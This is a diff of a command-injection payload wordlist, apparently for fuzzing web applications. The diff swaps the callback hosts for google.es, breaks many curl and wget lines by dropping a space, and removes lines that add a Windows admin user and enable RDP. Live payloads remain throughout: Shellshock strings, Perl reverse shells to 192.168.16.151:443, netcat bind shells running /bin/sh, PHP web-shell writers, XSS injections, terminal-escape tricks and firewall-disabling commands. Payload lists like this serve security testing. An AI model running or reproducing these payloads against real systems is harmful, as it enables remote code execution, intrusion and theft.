@@ -10,7 +10,6 @@
 && 
 %0a
 %0a%0d
-
 %0Aid
 %0a id %0a
 %0Aid%0A
@@ -25,15 +24,15 @@ a|id|
 a;id|
 a;id;
 a;id\n
-() { :;}; curl http://135.23.158.130/.testing/shellshock.txt?vuln=12
-| curl http://crowdshield.com/.testing/rce.txt
-& curl http://crowdshield.com/.testing/rce.txt
-; curl https://crowdshield.com/.testing/rce_vuln.txt
-&& curl https://crowdshield.com/.testing/rce_vuln.txt
-curl https://crowdshield.com/.testing/rce_vuln.txt
- curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\" |curl https://crowdshield.com/.testing/rce_vuln.txt
-curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\" |curl https://crowdshield.com/.testing/rce_vuln.txt
-$(`curl https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`)
+() { :;}; curl https://google.es/.testing/shellshock.txt?vuln=12
+| curl http://google.es/.testing/rce.txt
+& curl http://google.es/.testing/rce.txt
+; curlhttps://google.es
+&& curlhttps://google.es
+curlhttps://google.es
+ curlhttps://google.es ||`curlhttps://google.es` #' |curlhttps://google.es||`curlhttps://google.es` #\" |curlhttps://google.es
+curlhttps://google.es ||`curlhttps://google.es` #' |curlhttps://google.es||`curlhttps://google.es` #\" |curlhttps://google.es
+$(`curlhttps://google.es?req=22jjffjbn`)
 dir
 | dir
 ; dir
@@ -57,7 +56,7 @@ dir C:\Documents and Settings\*
 && dir C:\Users
 dir C:\Users
 ;echo%20'<script>alert(1)</script>'
-echo '<img src=https://crowdshield.com/.testing/xss.js onload=prompt(2) onerror=alert(3)></img>'// XXXXXXXXXXX
+echo '<img src=https://google.es/.testing/xss.js onload=prompt(2) onerror=alert(3)></img>'// XXXXXXXXXXX
 | echo "<?php include($_GET['page'])| ?>" > rfi.php
 ; echo "<?php include($_GET['page']); ?>" > rfi.php
 & echo "<?php include($_GET['page']); ?>" > rfi.php
@@ -75,7 +74,7 @@ echo "<?php system('dir $_GET['dir']'); ?>" > dir.php
 echo "<?php system($_GET['cmd']); ?>" > cmd.php
 ;echo '<script>alert(1)</script>'
 echo '<script>alert(1)</script>'// XXXXXXXXXXX
-echo '<script src=https://crowdshield.com/.testing/xss.js></script>'// XXXXXXXXXXX
+echo '<script src=https://google.es/.testing/xss.js></script>'// XXXXXXXXXXX
 | echo "use Socket;$i="192.168.16.151";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">;S");open(STDOUT,">;S");open(STDERR,">;S");exec("/bin/sh -i");};" > rev.pl
 ; echo "use Socket;$i="192.168.16.151";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">;S");open(STDOUT,">;S");open(STDERR,">;S");exec("/bin/sh -i");};" > rev.pl
 & echo "use Socket;$i="192.168.16.151";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};" > rev.pl
@@ -158,8 +157,8 @@ ls -l /tmp
 && ls -l /var/www/*
 ls -l /var/www/*
 \n
-\n\033[2curl http://135.23.158.130/.testing/term_escape.txt?vuln=1?user=\`whoami\`
-\n\033[2wget http://135.23.158.130/.testing/term_escape.txt?vuln=2?user=\`whoami\`
+\n\033[2curl https://google.es/.testing/term_escape.txt?vuln=1?user=\`whoami\`
+\n\033[2wget https://google.es/.testing/term_escape.txt?vuln=2?user=\`whoami\`
 \n/bin/ls -al\n
 | nc -lvvp 4444 -e /bin/sh|
 ; nc -lvvp 4444 -e /bin/sh;
@@ -170,18 +169,9 @@ nc -lvvp 4445 -e /bin/sh &
 nc -lvvp 4446 -e /bin/sh|
 nc -lvvp 4447 -e /bin/sh;
 nc -lvvp 4448 -e /bin/sh&
-\necho INJECTX\nexit\n\033[2Acurl https://crowdshield.com/.testing/rce_vuln.txt\n
+\necho INJECTX\nexit\n\033[2Acurl https://google.es\n
 \necho INJECTX\nexit\n\033[2Asleep 5\n
-\necho INJECTX\nexit\n\033[2Awget https://crowdshield.com/.testing/rce_vuln.txt\n
-| net localgroup Administrators hacker /ADD
-; net localgroup Administrators hacker /ADD
-& net localgroup Administrators hacker /ADD
-&& net localgroup Administrators hacker /ADD
-net localgroup Administrators hacker /ADD
-| netsh firewall set opmode disable
-; netsh firewall set opmode disable
-& netsh firewall set opmode disable
-&& netsh firewall set opmode disable
+\necho INJECTX\nexit\n\033[2Awget https://google.es\n
 netsh firewall set opmode disable
 netstat
 ;netstat -a;
@@ -190,11 +180,6 @@ netstat
 & netstat -an
 && netstat -an
 netstat -an
-| net user hacker Password1 /ADD
-; net user hacker Password1 /ADD
-& net user hacker Password1 /ADD
-&& net user hacker Password1 /ADD
-net user hacker Password1 /ADD
 | net view
 ; net view
 & net view
@@ -238,13 +223,13 @@ perl -e 'print "X"x81920'
 && phpinfo()
 phpinfo()
 phpinfo();
-<?php system("curl https://crowdshield.com/.testing/rce_vuln.txt?method=phpsystem_get");?>
-<?php system("curl https://crowdshield.com/.testing/rce_vuln.txt?req=df2fkjj");?>
+<?php system("curl https://google.es?method=phpsystem_get");?>
+<?php system("curl https://google.es?req=df2fkjj");?>
 <?php system("echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX");?>
 <?php system("sleep 10");?>
 <?php system("sleep 5");?>
-<?php system("wget https://crowdshield.com/.testing/rce_vuln.txt?method=phpsystem_get");?>
-<?php system("wget https://crowdshield.com/.testing/rce_vuln.txt?req=jdfj2jc");?>
+<?php system("wget https://google.es?method=phpsystem_get");?>
+<?php system("wget https://google.es?req=jdfj2jc");?>
 :phpversion();
 `ping 127.0.0.1`
 & ping -i 30 127.0.0.1 &
@@ -258,11 +243,6 @@ pwd
 & pwd
 && pwd
 \r
-| reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
-; reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
-& reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
-&& reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
-reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
 \r\n
 route
 | sleep 1
@@ -300,13 +280,13 @@ sysinfo
 && sysinfo
 system('cat C:\boot.ini');
 system('cat config.php');
-|| system('curl https://crowdshield.com/.testing/rce_vuln.txt');
-| system('curl https://crowdshield.com/.testing/rce_vuln.txt');
-; system('curl https://crowdshield.com/.testing/rce_vuln.txt');
-& system('curl https://crowdshield.com/.testing/rce_vuln.txt');
-&& system('curl https://crowdshield.com/.testing/rce_vuln.txt');
-system('curl https://crowdshield.com/.testing/rce_vuln.txt')
-system('curl https://crowdshield.com/.testing/rce_vuln.txt?req=22fd2wdf')
+|| system('curlhttps://google.es');
+| system('curlhttps://google.es');
+; system('curlhttps://google.es');
+& system('curlhttps://google.es');
+&& system('curlhttps://google.es');
+system('curlhttps://google.es')
+system('curlhttps://google.es?req=22fd2wdf')
 system('curl https://xerosecurity.com/.testing/rce_vuln.txt');
 system('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX')
 systeminfo
@@ -324,7 +304,7 @@ system('pwd');
 && system('sleep 5');
 system('sleep 5')
 system('sleep 5');
-system('wget https://crowdshield.com/.testing/rce_vuln.txt?req=22fd2w23')
+system('wgethttps://google.es?req=22fd2w23')
 system('wget https://xerosecurity.com/.testing/rce_vuln.txt');
 system('whoami')
 system('whoami');
@@ -373,15 +353,15 @@ uname -a
 ;|/usr/bin/id|
 ;/usr/bin/id|
 $;/usr/bin/id
-() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://135.23.158.130/.testing/shellshock.txt?vuln=13;curl http://135.23.158.130/.testing/shellshock.txt?vuln=15;\");'
-() { :;}; wget http://135.23.158.130/.testing/shellshock.txt?vuln=11
-| wget http://crowdshield.com/.testing/rce.txt
-& wget http://crowdshield.com/.testing/rce.txt
-; wget https://crowdshield.com/.testing/rce_vuln.txt
-$(`wget https://crowdshield.com/.testing/rce_vuln.txt`)
-&& wget https://crowdshield.com/.testing/rce_vuln.txt
-wget https://crowdshield.com/.testing/rce_vuln.txt
-$(`wget https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`)
+() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget https://google.es/.testing/shellshock.txt?vuln=13;curl https://google.es/.testing/shellshock.txt?vuln=15;\");'
+() { :;}; wget https://google.es/.testing/shellshock.txt?vuln=11
+| wget https://google.es/.testing/rce.txt
+& wget https://google.es/.testing/rce.txt
+; wgethttps://google.es
+$(`wgethttps://google.es`)
+&& wgethttps://google.es
+wgethttps://google.es
+$(`wgethttps://google.es?req=22jjffjbn`)
 which curl
 which gcc
 which nc
